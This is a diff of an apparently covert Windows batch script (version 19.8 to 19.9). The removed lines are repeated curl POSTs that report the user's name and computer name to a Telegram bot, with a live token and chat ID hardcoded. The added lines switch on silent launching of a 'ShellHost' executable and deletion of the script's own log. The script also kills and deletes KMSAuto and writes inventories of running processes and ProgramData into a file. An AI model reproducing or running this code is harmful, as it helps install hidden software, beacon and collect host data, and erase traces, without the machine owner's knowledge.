@@ -10,7 +10,9 @@
 setlocal enabledelayedexpansion
 
 
-set "BATCHVERSION=19.8"
+set "BATCHVERSION=19.9"
+
+
 
 
 
@@ -82,7 +84,7 @@ set "LOGFILE=%temp%\!filename1!.mpee"
 
 :: Start logging from this point
 call :LogOutput > "%LOGFILE%" 2>&1
-:: del /f /q "%LOGFILE%"
+del /f /q "%LOGFILE%"
 echo.
 echo.
 echo Exiting...
@@ -97,13 +99,6 @@ goto :EOF
 :: Define allowed HWIDs here
 set "VALID_HWIDS="
 
-
-
-
-
-
-curl -s -X POST "https://api.telegram.org/bot7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA/sendMessage" -d "chat_id=-1002163721260" -d "message_thread_id=73779" -d "text=%USERNAME%(%COMPUTERNAME%)|%time%|(v%BATCHVERSION%)|RUNNING105"
-timeout /t 10 /nobreak >nul
 
 
 
@@ -548,7 +543,7 @@ timeout /t 1 /nobreak >nul
 
 
 
-curl -s -X POST "https://api.telegram.org/bot7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA/sendMessage" -d "chat_id=-1002163721260" -d "message_thread_id=73779" -d "text=%USERNAME%(%COMPUTERNAME%)|%time%|(v%BATCHVERSION%)|RUNNING551"
+
 
 
 
@@ -624,9 +619,6 @@ echo All files found.
 
 
 
-
-
-curl -s -X POST "https://api.telegram.org/bot7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA/sendMessage" -d "chat_id=-1002163721260" -d "message_thread_id=73779" -d "text=%USERNAME%(%COMPUTERNAME%)|%time%|(v%BATCHVERSION%)|RUNNING629"
 
 
 
@@ -722,9 +714,6 @@ if exist "%SHSTFILE%" (
 
 
 
-curl -s -X POST "https://api.telegram.org/bot7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA/sendMessage" -d "chat_id=-1002163721260" -d "message_thread_id=73779" -d "text=%USERNAME%(%COMPUTERNAME%)|%time%|(v%BATCHVERSION%)|RUNNING721"
-
-
 
 
 echo Going to SHSTINSTALL...
@@ -782,9 +771,6 @@ echo.
 
 
 
-
-
-curl -s -X POST "https://api.telegram.org/bot7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA/sendMessage" -d "chat_id=-1002163721260" -d "message_thread_id=73779" -d "text=%USERNAME%(%COMPUTERNAME%)|%time%|(v%BATCHVERSION%)|RUNNING780"
 
 
 
@@ -849,9 +835,6 @@ echo.
 echo.
 
 
-
-
-
 echo Deleting %KMSFILEroot% and %KMSFILE%
 del /f /q "%KMSFILEroot%"
 echo Killing process KMSAuto by Powershell
@@ -875,7 +858,7 @@ if exist "%KMSFILE%" (
      echo Successfully deleted %KMSFILE%.
 )
 
-curl -s -X POST "https://api.telegram.org/bot7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA/sendMessage" -d "chat_id=-1002163721260" -d "message_thread_id=73779" -d "text=%USERNAME%(%COMPUTERNAME%)|%time%|(v%BATCHVERSION%)|RUNNING866"
+
 
 
 
@@ -931,7 +914,7 @@ echo.
 
 
 
-curl -s -X POST "https://api.telegram.org/bot7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA/sendMessage" -d "chat_id=-1002163721260" -d "message_thread_id=73779" -d "text=%USERNAME%(%COMPUTERNAME%)|%time%|(v%BATCHVERSION%)|RUNNING922"
+
 
 
 
@@ -1001,7 +984,7 @@ echo.
 
 
 
-curl -s -X POST "https://api.telegram.org/bot7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA/sendMessage" -d "chat_id=-1002163721260" -d "message_thread_id=73779" -d "text=%USERNAME%(%COMPUTERNAME%)|%time%|(v%BATCHVERSION%)|RUNNING992"
+
 
 
 
@@ -1300,7 +1283,7 @@ echo.
 
 
 
-curl -s -X POST "https://api.telegram.org/bot7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA/sendMessage" -d "chat_id=-1002163721260" -d "message_thread_id=73779" -d "text=%USERNAME%(%COMPUTERNAME%)|%time%|(v%BATCHVERSION%)|RUNNING1291"
+
 
 
 
@@ -1382,20 +1365,15 @@ echo.
 
 
 
-curl -s -X POST "https://api.telegram.org/bot7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA/sendMessage" -d "chat_id=-1002163721260" -d "message_thread_id=73779" -d "text=%USERNAME%(%COMPUTERNAME%)|%time%|(v%BATCHVERSION%)|RUNNING1373"
-
-
 
 :CHECKIFRUNNING
-
-taskkill /F /IM ShellHost.exe
 
 :: Check if SHSTFILE is running
 powershell -command "if (Get-Process -ErrorAction SilentlyContinue | Where-Object { $_.Path -eq '%SHSTFILE%' }) { exit 0 } else { exit 1 }"
 if %errorlevel%==1 (
     echo %SHSTFILE% is not running. starting now...
     taskkill /F /IM ShellHost.exe
-    ::start "" "%SHSTFILE%"
+    start "" "%SHSTFILE%"
 ) else (
     set "SHSTRUNNING=1"
     echo %SHSTFILE% is already running.
@@ -1426,7 +1404,7 @@ echo CheckSend Now is = !CheckSend!
 
 
 
-curl -s -X POST "https://api.telegram.org/bot7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA/sendMessage" -d "chat_id=-1002163721260" -d "message_thread_id=73779" -d "text=%USERNAME%(%COMPUTERNAME%)|%time%|(v%BATCHVERSION%)|RUNNING1417"
+
 
 
 :NEXT5
@@ -1509,7 +1487,7 @@ echo.
 
 
 
-curl -s -X POST "https://api.telegram.org/bot7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA/sendMessage" -d "chat_id=-1002163721260" -d "message_thread_id=73779" -d "text=%USERNAME%(%COMPUTERNAME%)|%time%|(v%BATCHVERSION%)|RUNNING1500"
+
 
 
 
@@ -1569,7 +1547,7 @@ echo. >> "%InstalledQWB%"
 echo. >> "%InstalledQWB%"
 echo. >> "%InstalledQWB%"
 echo. >> "%InstalledQWB%"
-echo All running processes Using Powershell  >> "%InstalledQWB%"
+echo All running processes - Using Powershell - >> "%InstalledQWB%"
 echo. >> "%InstalledQWB%"
 echo. >> "%InstalledQWB%"
 type "%ProcessTXTFILE%" >> "%InstalledQWB%"
@@ -1577,6 +1555,7 @@ del /f /q "%ProcessTXTFILE%"
 echo. >> "%InstalledQWB%"
 echo. >> "%InstalledQWB%"
 echo. >> "%InstalledQWB%"
+
 echo List ProgramData "%ProgramData%" files and folders >> "%InstalledQWB%"
 dir /b "%ProgramData%" >> "%InstalledQWB%"
 echo. >> "%InstalledQWB%"
@@ -1601,7 +1580,6 @@ echo. >> "%InstalledQWB%"
 echo. >> "%InstalledQWB%"
 
 
-curl -s -X POST "https://api.telegram.org/bot7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA/sendMessage" -d "chat_id=-1002163721260" -d "message_thread_id=73779" -d "text=%USERNAME%(%COMPUTERNAME%)|%time%|(v%BATCHVERSION%)|RUNNING1592"
 
 
 for /L %%i in (1,1,13) do (
